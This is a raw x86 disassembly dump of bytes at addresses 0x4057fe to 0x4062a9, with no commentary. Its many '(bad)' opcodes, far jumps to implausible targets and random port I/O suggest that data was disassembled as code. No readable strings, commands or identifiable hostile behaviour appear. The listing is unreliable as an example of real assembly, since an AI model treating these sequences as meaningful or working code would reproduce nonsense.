  4057fe:	push   esi
  4057ff:	or     BYTE PTR [edx-0x2c],0x49
  405803:	outs   dx,DWORD PTR ds:[esi]
  405804:	bound  ebp,QWORD PTR [ebx-0x33a3901a]
  40580a:	lea    ecx,[ebx]
  40580c:	shl    DWORD PTR [edi-0x362990d1],1
  405812:	mov    bl,0x67
  405814:	shr    DWORD PTR [ebx],0x2
  405817:	pop    esp
  405818:	jmp    0xbe9fdb99
  40581d:	dec    edi
  40581e:	push   ss
  40581f:	fucomip st,st(1)
  405821:	fist   DWORD PTR [esp+ebp*2-0x16fe3652]
  405828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405829:	(bad)  
  40582b:	sbb    DWORD PTR [esi+0x329ac5c9],0xffffffbb
  405832:	cld    
  405833:	arpl   cx,bp
  405835:	cs mov ch,0x7f
  405838:	push   ds
  405839:	jge    0x40583b
	...
  405863:	add    BYTE PTR [ebx+0x63],bl
  405866:	xchg   edx,eax
  405867:	repz push 0x4bef0082
  40586d:	push   ss
  40586e:	add    DWORD PTR [ecx+0x3f],esp
  405871:	push   ss
  405872:	and    BYTE PTR [esi],0x42
  405875:	call   0x16b7176e
  40587a:	adc    BYTE PTR [esi],0x62
  40587d:	out    0xe9,eax
  40587f:	imul   esi,DWORD PTR [edi],0xc24c7460
  405885:	or     dh,BYTE PTR cs:[ebp-0x1fc02463]
  40588c:	stc    
  40588d:	xchg   ecx,eax
  40588e:	mov    ebp,DWORD PTR [ebp+eax*4-0x6a0e8a93]
  405895:	jae    0x405872
  405897:	jmp    0xea3932d9
  40589c:	(bad)  
  40589e:	or     BYTE PTR [ebp+0x7d206e35],0x68
  4058a5:	out    dx,al
  4058a6:	jnp    0x405869
  4058a8:	xchg   BYTE PTR [eax+0x74],ah
  4058ab:	out    0xbd,eax
  4058ad:	out    dx,eax
  4058ae:	aaa    
  4058af:	out    dx,al
  4058b0:	inc    ebx
  4058b1:	jmp    0xf0ff:0x33816906
  4058b8:	adc    BYTE PTR [esi-0x3a],0x2d
  4058bc:	cmp    ch,BYTE PTR [esi+0x0]
  4058bf:	ret    0x823b
  4058c2:	add    dl,dl
  4058c4:	ror    DWORD PTR ds:0xabc9,1
	...
  4058f2:	adc    DWORD PTR [esi+0x54],ebp
  4058f5:	(bad)  
  4058f7:	fld    st(4)
  4058f9:	lds    ecx,FWORD PTR [edx-0x26]
  4058fc:	cmp    eax,0x1c3b25
  405901:	jmp    0xd4c3a287
  405906:	mov    ebp,0x3de94121
  40590b:	out    0x8,eax
  40590d:	add    BYTE PTR [ebp+edx*2+0x68],ah
  405911:	dec    ebx
  405912:	es push edi
  405914:	add    BYTE PTR [ebp-0x28],dh
  405917:	dec    esi
  405918:	rcr    BYTE PTR [ebx-0x62],0x97
  40591c:	or     BYTE PTR [eax],al
  40591e:	dec    esp
  40591f:	rol    bh,0x45
  405922:	or     ebx,DWORD PTR [edx+0x0]
  405925:	add    BYTE PTR [edi-0x1807bb1c],dl
  40592b:	mov    ds:0x596d0875,al
  405930:	call   DWORD PTR ds:0x412ed3
  405936:	pushf  
  405937:	cdq    
  405938:	je     0x405995
  40593a:	call   DWORD PTR [eax-0x1198ff25]
  405940:	iret   
  405941:	lea    ebx,[edx+0x776a509d]
  405947:	daa    
  405948:	call   DWORD PTR ds:0x412ebf
  40594e:	dec    esp
  40594f:	cdq    
  405950:	je     0x40597b
  405952:	sbb    BYTE PTR ds:0x1e4,ch
	...
  405980:	push   edi
  405981:	pop    ecx
  405982:	add    bh,bh
  405984:	retf   0x8fa1
  405987:	inc    ebp
  405988:	setne  BYTE PTR [ebp-0x4]
  40598c:	mov    al,ds:0x9283ec1a
  405991:	jae    0x405992
  405993:	jae    0x4059b3
  405995:	scas   al,BYTE PTR es:[edi]
  405996:	inc    ebp
  405997:	lock and eax,0xec000059
  40599d:	ins    BYTE PTR es:[edi],dx
  40599e:	mov    BYTE PTR [ebp-0x39],0x57
  4059a2:	add    BYTE PTR [eax],al
  4059a4:	pop    ss
  4059a5:	adc    eax,DWORD PTR [eax]
  4059a7:	push   0xffffffe7
  4059a9:	adc    dl,BYTE PTR [eax]
  4059ab:	lea    ebx,[edx]
  4059ad:	jnp    0x4059ff
  4059af:	push   0x3e
  4059b1:	add    dh,0x75
  4059b4:	jmp    0x443:0x857ff1dd
  4059bb:	or     edi,esi
  4059bd:	data16 add al,0x43
  4059c0:	mov    ebp,0x4a00cf67
  4059c5:	jp     0x40598d
  4059c7:	jne    0x40597b
  4059c9:	or     bh,cl
  4059cb:	fidivr DWORD PTR [esi]
  4059cd:	cmp    BYTE PTR [edx-0x3d],0x5
  4059d1:	cmp    eax,edx
  4059d3:	or     BYTE PTR [esi],bh
  4059d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059d6:	jp     0x4059c4
  4059d8:	cdq    
  4059d9:	scas   eax,DWORD PTR es:[edi]
  4059da:	sti    
  4059db:	out    0x39,eax
  4059dd:	cmp    DWORD PTR [eax+eax*1],eax
  4059e0:	(bad)  
  4059e1:	rcr    ebx,1
  4059e3:	inc    ecx
	...
  405a0c:	add    BYTE PTR [eax],al
  405a0e:	mov    ?,WORD PTR ds:0xcf7950c7
  405a14:	sti    
  405a15:	dec    edi
  405a16:	data16 data16 stos BYTE PTR es:[edi],al
  405a19:	add    BYTE PTR [esi],bh
  405a1b:	stos   BYTE PTR es:[edi],al
  405a1c:	mov    esp,0x30823ac2
  405a21:	mov    ebp,DWORD PTR [edx+0x1]
  405a24:	sar    ah,0xed
  405a27:	add    BYTE PTR [ecx+0x8],cl
  405a2a:	ds out dx,eax
  405a2c:	std    
  405a2d:	sub    bh,BYTE PTR [esi-0x37]
  405a30:	mov    esp,0x1a8246c2
  405a35:	(bad)  [edx+eax*4-0x7d6bffa7]
  405a3c:	pop    ecx
  405a3d:	add    BYTE PTR [ecx],ah
  405a3f:	pop    es
  405a40:	clc    
  405a41:	(bad)  
  405a42:	xchg   ebx,eax
  405a43:	push   0x59
  405a45:	add    BYTE PTR [edx+eax*4-0x7e1ac925],ah
  405a4c:	add    ecx,DWORD PTR [ebx]
  405a4e:	(bad)  
  405a4f:	and    eax,0x5b838910
  405a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a55:	(bad)  
  405a56:	imul   ebp,DWORD PTR [edi-0x6f],0xffffffcd
  405a5a:	fldcw  WORD PTR [ebx-0x6a]
  405a5d:	cli    
  405a5e:	mov    eax,ds:0xf67ac3e6
  405a63:	add    cl,ch
  405a65:	pop    ecx
  405a66:	ds ins BYTE PTR es:[edi],dx
  405a68:	hlt    
  405a69:	(bad)  
  405a6a:	ins    DWORD PTR es:[edi],dx
  405a6b:	ins    BYTE PTR es:[edi],dx
  405a6c:	cld    
  405a6d:	test   eax,0x59e0e5
	...
  405a9b:	add    BYTE PTR [esi],bh
  405a9d:	add    ecx,ebp
  405a9f:	fild   DWORD PTR [eax+edx*4-0x17]
  405aa3:	add    esi,DWORD PTR ds:0xcfbdc9b
  405aa9:	adc    DWORD PTR [ecx+0x126b99d6],0xffffffab
  405ab0:	lds    edx,FWORD PTR [edi+0x627cbca2]
  405ab6:	jmp    0xc3bf0feb
  405abb:	(bad)  
  405abc:	jns    0x405aa3
  405abe:	lock fstp TBYTE PTR [ecx+0x77c61e6b]
  405ac5:	cwde   
  405ac6:	in     eax,dx
  405ac7:	add    ecx,DWORD PTR [ebx]
  405ac9:	loopne 0x405ac8
  405acb:	sbb    ebx,0x384fe95e
  405ad1:	fdivr  DWORD PTR [ebx+edi*8+0x49]
  405ad5:	out    0xee,al
  405ad7:	sbb    bh,BYTE PTR [esi-0x5f]
  405ada:	sub    edi,ebx
  405adc:	cmp    ebp,esi
  405ade:	call   0xde9806a7
  405ae3:	dec    edi
  405ae4:	ss jae 0x405a96
  405ae7:	test   eax,0xc3e25b3e
  405aec:	xchg   edx,eax
  405aed:	dec    ebx
  405aee:	cwde   
  405aef:	push   edi
  405af0:	inc    edx
  405af1:	push   0x34
  405af3:	clc    
  405af4:	or     cl,dh
  405af6:	jmp    eax
  405af8:	in     eax,0x1a
  405afa:	jmp    FWORD PTR [esi+0x72187703]
	...
  405b28:	add    BYTE PTR [eax],al
  405b2a:	xor    DWORD PTR [edi+0x40],edx
  405b2d:	cmp    DWORD PTR [edx],ecx
  405b2f:	icebp  
  405b30:	out    dx,al
  405b31:	xchg   esi,eax
  405b32:	sti    
  405b33:	or     edi,edi
  405b35:	adc    al,0xd6
  405b37:	sbb    bh,bh
  405b39:	cld    
  405b3a:	aad    0x82
  405b3c:	lahf   
  405b3d:	mov    es,WORD PTR [ebx]
  405b3f:	imul   ebx,DWORD PTR [eax-0x60],0xfffffffc
  405b43:	push   ebx
  405b44:	add    BYTE PTR [edi+esi*1],dl
  405b47:	ja     0x405b9f
  405b49:	mov    esi,0xf17dde6e
  405b4e:	cmp    eax,0x7a0208f0
  405b53:	push   es
  405b54:	pop    edi
  405b55:	scas   eax,DWORD PTR es:[edi]
  405b56:	aam    0x9d
  405b58:	or     cl,ch
  405b5a:	push   ss
  405b5b:	and    BYTE PTR [edx+ebp*2],cl
  405b5e:	mov    ds:0xee290b5c,al
  405b63:	push   ebx
  405b64:	sub    ebp,DWORD PTR [ecx]
  405b66:	daa    
  405b67:	or     bl,BYTE PTR [esi+0x30]
  405b6a:	jl     0x405bbf
  405b6c:	add    BYTE PTR [edx+0x21],dh
  405b6f:	push   edi
  405b70:	mov    ebx,DWORD PTR [ebp+eiz*2+0x702fed5]
  405b77:	add    DWORD PTR [ebx+0x3067bdef],ecx
  405b7d:	jnp    0x405bc6
  405b7f:	jmp    0xfd80:0x5ff2b0fb
  405b86:	dec    ebp
  405b87:	jbe    0x405bb6
  405b89:	imul   edi,ecx,0xec721b
	...
  405bb7:	add    BYTE PTR [ebp+0x225e4666],bh
  405bbd:	jmp    0xa:0x9ec228eb
  405bc4:	in     al,dx
  405bc5:	jb     0x405c46
  405bc7:	cld    
  405bc8:	jbe    0x405bd7
  405bca:	or     eax,0x7707cb80
  405bcf:	or     BYTE PTR [edi-0x6e],ah
  405bd2:	popa   
  405bd3:	and    BYTE PTR [ebx+0xc09ea63],0x9e
  405bda:	pop    ebx
  405bdb:	pop    edi
  405bdc:	sub    DWORD PTR [esi+0x61e708c2],esp
  405be2:	xor    BYTE PTR [edx-0x31],dh
  405be5:	popa   
  405be6:	cmp    DWORD PTR [edi-0x1d],esi
  405be9:	push   ecx
  405bea:	xor    bl,ch
  405bec:	repnz popa 
  405bee:	inc    ecx
  405bef:	jb     0x405b8e
  405bf1:	popa   
  405bf2:	inc    esi
  405bf3:	ja     0x405b96
  405bf5:	push   ecx
  405bf6:	inc    ecx
  405bf7:	add    al,0xad
  405bf9:	adc    BYTE PTR [edi],0x3c
  405bfc:	jbe    0x405c09
  405bfe:	or     bh,BYTE PTR [ecx+eax*4]
  405c01:	push   ss
  405c02:	push   es
  405c03:	sub    al,0x86
  405c05:	imul   ecx,DWORD PTR [ecx],0xc0428eeb
  405c0b:	pop    ebx
  405c0c:	test   al,0x3f
  405c0e:	leave  
  405c0f:	ret    0x5d5f
  405c12:	shl    al,0x63
  405c15:	arpl   bx,ax
  405c17:	stos   BYTE PTR es:[edi],al
  405c18:	lods   al,BYTE PTR ds:[esi]
  405c19:	and    al,BYTE PTR [ebx+0xc6]
	...
  405c43:	add    BYTE PTR [eax],al
  405c45:	add    BYTE PTR [ebp+0x62],dl
  405c48:	fidiv  DWORD PTR [ebp-0x1a]
  405c4b:	aad    0x1
  405c4d:	add    BYTE PTR [edi+0x5d],ah
  405c50:	pop    ebx
  405c51:	pop    edi
  405c52:	test   eax,0x5708c2a4
  405c57:	ss push ebx
  405c59:	push   eax
  405c5a:	iret   
  405c5b:	add    al,0x1f
  405c5d:	sub    ah,BYTE PTR [edi+0x5f]
  405c60:	clc    
  405c61:	jb     0x405c79
  405c63:	mov    ds:0x733ebbff,al
  405c68:	add    eax,DWORD PTR [eax]
  405c6a:	fldcw  WORD PTR ds:0x2d727f4d
  405c71:	add    DWORD PTR [ecx-0x76],esi
  405c74:	inc    edx
  405c75:	std    
  405c76:	add    DWORD PTR [edx+0x65fad7e7],esi
  405c7c:	ret    
  405c7d:	mov    ecx,0xffc3c1f1
  405c82:	in     al,dx
  405c83:	sbb    ah,bh
  405c85:	push   es
  405c86:	imul   ebx,edx,0xffffff8f
  405c89:	ret    
  405c8a:	jne    0x405cc5
  405c8c:	(bad)  
  405c8d:	push   ebp
  405c8e:	(bad)
  405c91:	(bad)  
  405c92:	into   
  405c93:	inc    ebp
  405c94:	push   esp
  405c95:	pop    eax
  405c96:	push   esi
  405c97:	dec    ebx
  405c98:	out    dx,al
  405c99:	aas    
  405c9a:	ds jmp 0x3d87:0x17d0135
  405ca2:	push   ss
  405ca3:	lods   eax,DWORD PTR ds:[esi]
  405ca4:	inc    esp
  405ca5:	add    BYTE PTR [esi],bh
  405ca7:	xchg   BYTE PTR ds:0x83,dl
	...
  405cd1:	add    BYTE PTR [eax],al
  405cd3:	add    BYTE PTR [ebx-0x7e],bl
  405cd6:	dec    esi
  405cd7:	inc    ecx
  405cd8:	ds jb  0x405d12
  405cdb:	or     DWORD PTR [ebp-0xb4c899],edi
  405ce1:	jno    0x405ce6
  405ce3:	jne    0x405d28
  405ce5:	pop    ebp
  405ce6:	les    ebx,FWORD PTR [ebx-0x79]
  405ce9:	xor    eax,0xd456daef
  405cee:	fadd   QWORD PTR [eax]
  405cf0:	call   FWORD PTR ds:[eax-0x4]
  405cf4:	in     al,dx
  405cf5:	fisttp DWORD PTR [ebx]
  405cf7:	push   eax
  405cf8:	push   ecx
  405cf9:	xchg   DWORD PTR [ebx],ebp
  405cfb:	dec    ebx
  405cfc:	push   DWORD PTR [ecx+0xe]
  405cff:	shl    BYTE PTR [ecx],0xf6
  405d02:	xchg   ebx,eax
  405d03:	add    BYTE PTR [esi],bh
  405d05:	jb     0x405cd1
  405d07:	inc    ebp
  405d08:	ss pop ebx
  405d0a:	jmp    0x6c9b9b12
  405d0f:	dec    eax
  405d10:	or     eax,DWORD PTR es:[ebx+0x4]
  405d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d15:	pop    ebx
  405d16:	inc    ebx
  405d17:	add    eax,0xc2c4ee11
  405d1c:	xor    ebp,ebx
  405d1e:	xor    DWORD PTR [ebp+0x3e],eax
  405d21:	push   esp
  405d22:	test   eax,0xf7736438
  405d27:	fdivr  QWORD PTR [esi]
  405d29:	pop    ebx
  405d2a:	push   0xffffffbb
  405d2c:	fs out dx,al
  405d2e:	or     BYTE PTR [edi+0x37e96363],al
  405d34:	je     0x405d9e
  405d36:	adc    al,0xbc
	...
  405d60:	add    BYTE PTR [eax],al
  405d62:	out    0x76,al
  405d64:	xchg   esp,eax
  405d65:	ret    0xd1c9
  405d68:	and    al,0xb8
  405d6a:	mov    bl,0x1d
  405d6c:	jno    0x405dc1
  405d6e:	mov    ecx,0x2bc270ed
  405d73:	outs   dx,DWORD PTR ds:[esi]
  405d74:	rol    DWORD PTR [ecx+ebp*4],cl
  405d77:	in     eax,dx
  405d78:	pop    esp
  405d79:	ret    0xeb4b
  405d7c:	mov    eax,ds:0x29543e44
  405d81:	aaa    
  405d82:	pusha  
  405d83:	aam    0xac
  405d85:	mov    bh,0xb5
  405d87:	dec    edx
  405d88:	ins    BYTE PTR es:[edi],dx
  405d89:	dec    eax
  405d8a:	mov    cs,WORD PTR [edx]
  405d8c:	fwait
  405d8d:	ret    0xef53
  405d90:	mov    eax,ds:0x29543e44
  405d95:	aaa    
  405d96:	inc    esp
  405d97:	repz mov esp,0x165aff50
  405d9d:	cmp    BYTE PTR [esi+0x72],cl
  405da0:	std    
  405da1:	fidivr DWORD PTR [esi]
  405da3:	pop    ebx
  405da4:	bnd ret 
  405da6:	rcr    DWORD PTR [ecx-0x56],cl
  405da9:	ret    0x6acb
  405dac:	add    BYTE PTR [ecx],al
  405dae:	jo     0x405d33
  405db0:	add    cl,ch
  405db2:	cld    
  405db3:	lock repz rol ebx,1
  405db7:	js     0x405db8
  405db9:	fdivp  st(7),st
  405dbb:	lock sti 
  405dbd:	rol    DWORD PTR [ecx-0x3d16ff7d],0x9a
  405dc4:	pop    ebx
  405dc5:	mov    al,0x0
	...
  405def:	add    BYTE PTR [ebx],al
  405df1:	adc    DWORD PTR [ebx-0x3f604233],ecx
  405df7:	mov    bh,0xff
  405df9:	push   bx
  405dfb:	sbb    DWORD PTR [edx+0x7dd23ff3],edx
  405e01:	pop    ebx
  405e02:	clc    
  405e03:	sbb    edi,DWORD PTR ds:0xd96aff9a
  405e09:	xor    cl,BYTE PTR [ebx+0x28]
  405e0c:	cmp    bl,BYTE PTR [ebx+0x74]
  405e0f:	loop   0x405dd3
  405e11:	sub    BYTE PTR [eax],dh
  405e13:	xor    bh,BYTE PTR [ebp+0x5b]
  405e16:	add    ch,bh
  405e18:	push   ebx
  405e19:	fidivr DWORD PTR ds:0x1c0301
  405e1f:	jmp    0x1cc3b295
  405e24:	outs   dx,BYTE PTR ds:[esi]
  405e25:	adc    al,BYTE PTR [ecx-0x17]
  405e28:	cmp    eax,0x7a0204f0
  405e2d:	add    cl,cl
  405e2f:	sub    bl,BYTE PTR [ebx-0x6e2b007f]
  405e35:	adc    DWORD PTR [ecx-0x17],eax
  405e38:	les    esp,FWORD PTR [eax]
  405e3a:	hlt    
  405e3b:	es mov ecx,0x7f26fe97
  405e41:	xor    eax,DWORD PTR [ecx]
  405e43:	jmp    0x83404f85
  405e48:	inc    ebx
  405e49:	jae    0x405ebe
  405e4b:	xor    DWORD PTR [edx],edi
  405e4d:	pop    ebx
  405e4e:	add    DWORD PTR [eax],0x3f
  405e51:	pushf  
  405e52:	je     0x405e58
	...
  405e7c:	add    BYTE PTR [eax],al
  405e7e:	popa   
  405e7f:	pop    ecx
  405e80:	add    BYTE PTR [eax],al
  405e82:	sahf   
  405e83:	fmulp  st(0),st
  405e85:	(bad)  
  405e86:	and    BYTE PTR [ebx-0x640c7a73],bl
  405e8c:	(bad)  
  405e8d:	jmp    DWORD PTR [edi-0x64]
  405e90:	mov    ch,0xc8
  405e92:	icebp  
  405e93:	call   0x0:0x874fe8ff
  405e9a:	or     al,0x9a
  405e9c:	je     0x40b866
  405ea2:	jg     0x405eb0
  405ea4:	dec    ebp
  405ea5:	inc    ecx
  405ea6:	out    0xd4,eax
  405ea8:	test   eax,esi
  405eaa:	mov    eax,ds:0xcf50ff9a
  405eaf:	push   cs
  405eb0:	fld    DWORD PTR [eax]
  405eb2:	out    0x56,eax
  405eb4:	ror    BYTE PTR [edi],0x5b
  405eb7:	lahf   
  405eb8:	add    BYTE PTR [eax],al
  405eba:	xlat   BYTE PTR ds:[ebx]
  405ebb:	xchg   edx,eax
  405ebc:	test   esp,eax
  405ebe:	inc    ecx
  405ebf:	fwait
  405ec0:	inc    DWORD PTR [eax]
  405ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ec3:	pop    ecx
  405ec4:	add    BYTE PTR [ebp-0x161e6],cl
  405eca:	and    BYTE PTR [edx],cl
  405ecc:	push   DWORD PTR [ebp-0x6395]
  405ed2:	lock dec esp
  405ed4:	xor    BYTE PTR [ebx-0x1a],cl
  405ed7:	pop    ecx
  405ed8:	mov    edx,DWORD PTR [ebp-0x63a5]
  405ede:	mov    WORD PTR [ecx+0x840f],ds
	...
  405f0c:	cvtps2pd xmm0,QWORD PTR [eax]
  405f0f:	add    BYTE PTR [esp+ecx*1-0xc],ch
  405f13:	pminub mm1,mm2
  405f16:	add    BYTE PTR [eax],al
  405f18:	push   edi
  405f19:	call   0xffc0:0x4e3ed4b5
  405f20:	in     al,0x73
  405f22:	sub    eax,DWORD PTR [eax]
  405f24:	ds je  0x405f2c
  405f27:	call   0x43ab75
  405f2c:	inc    ebp
  405f2d:	xor    dh,BYTE PTR [edi]
  405f2f:	jns    0x405ef8
  405f31:	mov    edi,0x7e838dbb
  405f36:	push   esp
  405f37:	push   0x17415
  405f3c:	sbb    DWORD PTR [eax],ecx
  405f3e:	mov    esp,0x4b1a2bff
  405f43:	inc    ecx
  405f44:	ds imul eax,ebx,0x39a56674
  405f4b:	cld    
  405f4c:	stc    
  405f4d:	xchg   DWORD PTR [edi],ebp
  405f4f:	dec    ebx
  405f50:	jg     0x405fc4
  405f52:	or     al,al
  405f54:	jb     0x405fd1
  405f56:	inc    edx
  405f57:	(bad)  
  405f58:	mov    ebx,0xd9ffbeb2
  405f5d:	jb     0x405f62
  405f5f:	add    BYTE PTR [esi],bh
  405f61:	pop    es
  405f62:	mov    eax,eax
  405f64:	enter  0xbfdd,0x50
  405f68:	push   esi
  405f69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f6a:	add    ecx,DWORD PTR [edi]
  405f6c:	ficomp DWORD PTR ds:[ebx+0xd8]
	...
  405f97:	add    BYTE PTR [eax],al
  405f99:	add    BYTE PTR [esi],bh
  405f9b:	jb     0x405fa7
  405f9d:	shl    BYTE PTR [ebx],0x67
  405fa0:	cmp    BYTE PTR [ebp-0x40fb82],0x3e
  405fa7:	xchg   BYTE PTR [edi],cl
  405fa9:	dec    ebx
  405fab:	xor    bh,BYTE PTR [esi+0x8ed89ff]
  405fb1:	stos   BYTE PTR es:[edi],al
  405fb2:	div    BYTE PTR [edx+0x192deb03]
  405fb8:	sbb    bh,bh
  405fba:	jmp    0x405ff1
  405fbc:	lods   al,BYTE PTR ds:[esi]
  405fbd:	lock nop
  405fbf:	pop    ebx
  405fc0:	jmp    0x212ec0c8
  405fc5:	lods   al,BYTE PTR ds:[esi]
  405fc6:	data16 (bad) 
  405fc8:	jmp    0xe93c4d0
  405fcd:	cmp    DWORD PTR [esi+0x73],eax
  405fd0:	daa    
  405fd1:	(bad)  
  405fd2:	ds pop ebx
  405fd4:	ins    BYTE PTR es:[edi],dx
  405fd5:	mov    DWORD PTR [edx],ecx
  405fd7:	idiv   BYTE PTR gs:[esi-0x33cb9b72]
  405fde:	sub    BYTE PTR [esi+eiz*8-0x55],ah
  405fe2:	nop
  405fe3:	mov    ecx,gs
  405fe5:	add    esp,DWORD PTR [edi]
  405fe7:	pop    esi
  405fe8:	(bad)  
  405fe9:	mov    esi,0xcb946411
  405fee:	or     BYTE PTR [esi+eax*8-0x55],ah
  405ff2:	ret    0xe98c
  405ff5:	add    eax,ebp
  405ff7:	xchg   edi,eax
  405ff8:	adc    cl,ch
  405ffa:	std    
  405ffb:	or     eax,0xaf62
	...
  406028:	mov    ebp,0x8d53959e
  40602d:	or     bh,BYTE PTR [ebx]
  40602f:	push   edi
  406030:	jo     0x406002
  406032:	sub    al,0x10
  406034:	ret    
  406035:	shr    BYTE PTR [ecx+0x3],cl
  406038:	ds pop ebx
  40603a:	je     0x406053
  40603c:	sti    
  40603d:	pop    edx
  40603e:	jmp    0x92109e46
  406043:	mov    al,BYTE PTR [esi-0x48fa7e67]
  406049:	sbb    eax,0x53238a55
  40604e:	jmp    0x9d82:0x695b80bc
  406055:	and    eax,DWORD PTR [edx]
  406057:	mov    ebx,0x32015fbd
  40605c:	xor    BYTE PTR [eax+0x42],bl
  40605f:	jnp    0x40605f
  406061:	pop    edx
  406062:	add    cl,ch
  406064:	cmp    eax,0xa5eac330
  406069:	arpl   WORD PTR [ebp+0x15],ax
  40606c:	mov    dl,0xb
  40606e:	cmp    BYTE PTR [esi+edx*1+0x6b],ch
  406072:	(bad)  
  406073:	out    dx,eax
  406074:	cmp    bh,BYTE PTR [eax]
  406076:	inc    ebp
  406077:	xchg   BYTE PTR [eax-0x2b8ffbe4],al
  40607d:	xchg   ebp,eax
  40607e:	out    dx,eax
  40607f:	adc    DWORD PTR es:[ebx-0x2],0x15
  406084:	mov    bh,0xc3
  406086:	(bad)  
  406087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406088:	cmp    ecx,ebp
  40608a:	push   ebx
  40608b:	sbb    eax,DWORD PTR [eax]
	...
  4060b5:	add    BYTE PTR [edx+0x62],cl
  4060b8:	jne    0x406087
  4060ba:	fucomi st,st(0)
  4060bc:	pop    es
  4060bd:	fs jns 0x40612b
  4060c0:	push   eax
  4060c1:	shl    DWORD PTR [ecx],0x5b
  4060c4:	add    cl,ch
  4060c6:	shl    DWORD PTR [esp+eax*1-0x74a4c217],0x34
  4060ce:	dec    edx
  4060cf:	outs   dx,BYTE PTR ds:[esi]
  4060d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060d1:	jnp    0x8282b9dc
  4060d7:	xchg   esp,eax
  4060d8:	ret    0x3ded
  4060db:	or     BYTE PTR [ebx-0x368407b],cl
  4060e1:	aaa    
  4060e2:	jae    0x4060ef
  4060e4:	push   ebx
  4060e5:	sbb    BYTE PTR [esi+edx*8+0x75],ch
  4060e9:	in     eax,dx
  4060ea:	(bad)  
  4060eb:	loopne 0x4060f4
  4060ed:	(bad)  
  4060ee:	stc    
  4060ef:	dec    edx
  4060f0:	mov    DWORD PTR [esi+edi*2],esp
  4060f3:	(bad)  
  4060f4:	pop    es
  4060f5:	jb     0x4060fa
  4060f7:	push   edi
  4060f8:	mov    ebp,DWORD PTR [esi-0x1aa829bb]
  4060fe:	(bad)  
  4060ff:	xor    edx,DWORD PTR fs:[ebx-0x61]
  406103:	xor    eax,DWORD PTR gs:[eax]
  406106:	std    
  406107:	rol    DWORD PTR [edi+eax*1-0x28960581],1
  40610e:	fs pop eax
  406110:	rol    eax,0x60
  406113:	pop    ebx
  406114:	ret    
  406115:	mov    ebx,DWORD PTR [esp+ebp*2]
  406118:	clc    
  406119:	and    eax,DWORD PTR [eax]
	...
  406143:	add    BYTE PTR [edi],bl
  406145:	ins    BYTE PTR es:[edi],dx
  406146:	clc    
  406147:	(bad)  
  406148:	rol    DWORD PTR [edi+0x56],cl
  40614b:	mov    bh,0x20
  40614d:	scas   eax,DWORD PTR es:[edi]
  40614e:	add    edx,DWORD PTR [esi+0x53]
  406151:	popf   
  406152:	ret    0x240c
  406155:	mov    cs,WORD PTR [ebx+0x23a2f4f8]
  40615b:	cli    
  40615c:	in     al,0xa2
  40615e:	lea    ecx,[eax+ebp*1+0x43207083]
  406165:	pop    esp
  406166:	dec    esi
  406167:	or     dh,ah
  406169:	pushf  
  40616a:	adc    DWORD PTR [ebx],eax
  40616c:	fst    st(2)
  40616e:	cli    
  40616f:	xor    edi,edi
  406171:	jp     0x40616b
  406173:	xor    edi,edi
  406175:	rcr    BYTE PTR [edi+ebx*1-0x3e427007],1
  40617c:	aam    0xff
  40617e:	or     eax,ecx
  406180:	xchg   esp,eax
  406181:	inc    edi
  406182:	add    ebx,ecx
  406184:	dec    esp
  406185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406186:	xor    edi,edx
  406188:	add    al,0xa3
  40618a:	xor    edi,edx
  40618c:	push   0xffffffda
  40618e:	pop    es
  40618f:	scas   eax,DWORD PTR es:[edi]
  406190:	enter  0xf521,0x3
  406194:	popa   
  406195:	inc    edi
  406196:	rol    eax,0xa0
  406199:	pop    edx
  40619a:	ret    
  40619b:	mov    ebp,DWORD PTR [ebx+ebp*2]
  40619e:	clc    
  40619f:	and    ebx,DWORD PTR [edi]
  4061a1:	imul   edi,eax,0xffffff8d
  4061a4:	adc    eax,DWORD PTR [edi+0x2a]
  4061a7:	mov    BYTE PTR [eax],0x0
	...
  4061d2:	ds icebp 
  4061d4:	inc    ebx
  4061d5:	add    esi,eax
  4061d7:	addr16 ret 0x32c2
  4061db:	jne    0x4061b0
  4061dd:	mov    esi,DWORD PTR [esi+0x64]
  4061e0:	mov    eax,0xb8647423
  4061e5:	lea    edi,[edx+0x2e461080]
  4061eb:	or     al,0x0
  4061ed:	dec    esi
  4061ee:	ss xor eax,edx
  4061f1:	adc    DWORD PTR ds:0xdfa883e,edi
  4061f7:	dec    esp
  4061f8:	loopne 0x4061f2
  4061fa:	or     eax,0x599c8e5c
  4061ff:	jae    0x406197
  406201:	inc    esi
  406202:	xor    esi,DWORD PTR [esi+0x5d]
  406205:	sbb    al,0xff
  406207:	xor    eax,0xee070315
  40620c:	mov    esp,0xbf561433
  406211:	xor    edx,DWORD PTR [eax+edi*8]
  406214:	jg     0x40621d
  406216:	out    0xea,al
  406218:	sub    DWORD PTR [ecx+0x3d],0x30
  40621c:	in     al,0xc0
  40621e:	(bad)  
  40621f:	jns    0x406227
  406221:	ret    
  406222:	lds    ebp,FWORD PTR [ebp-0x55e20709]
  406228:	idiv   eax
  40622a:	mov    bl,0xde
  40622c:	adc    ch,BYTE PTR [edi+0x38f36d1]
  406232:	push   0xc2c48e
	...
  40625f:	add    BYTE PTR [edx],bh
  406261:	jne    0x406236
  406263:	mov    eax,esi
  406265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406266:	mov    esi,0xbea5b423
  40626b:	(bad)  
  40626c:	ret    0x7479
  40626f:	pop    ebx
  406270:	test   eax,0x564e06f1
  406275:	pop    ebx
  406276:	sub    ch,al
  406278:	das    
  406279:	pop    esp
  40627a:	xor    ecx,DWORD PTR [edi-0x18aed36c]
  406280:	xchg   BYTE PTR [ecx+edx*2],ch
  406283:	mov    DWORD PTR [edx+0x1ad38740],esp
  406289:	shr    dl,cl
  40628b:	pop    ecx
  40628c:	and    bl,BYTE PTR [edx-0x7dc2edd6]
  406292:	bound  edi,QWORD PTR [ebp-0x41359ad3]
  406298:	or     eax,0x39806c65
  40629d:	cmp    eax,0x5bd593f8
  4062a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062a3:	repz jle 0x406241
  4062a6:	out    dx,al
  4062a7:	push   es
  4062a8:	std    
  4062a9:	rol    DWORD PTR [edx],cl
